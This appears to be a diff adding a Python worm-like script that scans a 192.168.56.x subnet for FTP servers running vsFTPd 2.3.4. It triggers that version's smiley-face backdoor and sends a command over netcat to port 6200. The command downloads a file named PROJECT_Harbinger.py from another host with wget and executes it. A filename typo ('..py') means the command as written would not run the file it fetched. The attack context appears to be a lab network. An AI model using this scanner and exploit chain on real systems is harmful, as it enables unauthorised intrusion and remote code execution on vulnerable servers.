@@ -1,1 +1,48 @@
+#!/usr/bin/python
+import os, socket, subprocess, time
+
+def sweeper():
+        print('*** SCANNING FOR TARGETS***')
+        #get the full range of available IPs on the network 
+        os.system('ifconfig | grep -w -o 192.168.56.... > own_ip.txt')
+        o = open('own_ip.txt')
+        own = o.readlines()
+        for ip in range (100,120):
+                if str('192.168.56.' + str(ip)) not in str(own):
+                    os.system('ping -c 1 -W 1 192.168.56.' + str(ip) +' | grep "bytes from" | cut -d \' \' -f 4 | tr -d \':\' >> ip_list.txt')
+                else:
+                    pass
+        f = open('ip_list.txt')  
+        for line in f.readlines():
+                line = line.strip('\n')
+                try:  
+                        s=socket.socket()  
+                        s.connect((line, 21))
+                        banner = s.recv(1024)  
+                        c = str(line) + ' : ' +  str(banner)
+                        if 'vsFTPd' in c and '2.3.4' in c:
+                            f.close()
+                            o.close()
+                            exploiter(line)
+                            return
+                except:
+                        pass
+
+def exploiter(line):
+        command = 'whoami && wget -q 192.168.56.108:8000/PROJECT_Harbinger.py && chmod +x PROJECT_Harbinger..py && ./PROJECT_Harbinger..py &'
+        print ('***TARGET LOCKED***: ' + line)
+        process = subprocess.Popen("echo 'USER user:)\nPASS pass' |  nc " + line + "  21", shell=True, stdin=subprocess.PIPE)
+        process.stdin.close()
+        time.sleep(10)
+        print('***ASSUMING DIRECT CONTROL***')
+        next_process = subprocess.Popen("echo '" + command + "' | nc " + str(line) +  " 6200", shell=True, stdin=subprocess.PIPE)
+        time.sleep(3)
+        next_process.stdin.close()
+        time.sleep(3)
+        return
+
+
+if not os.path.isfile('ip_list.txt'):
+            sweeper()
+
 
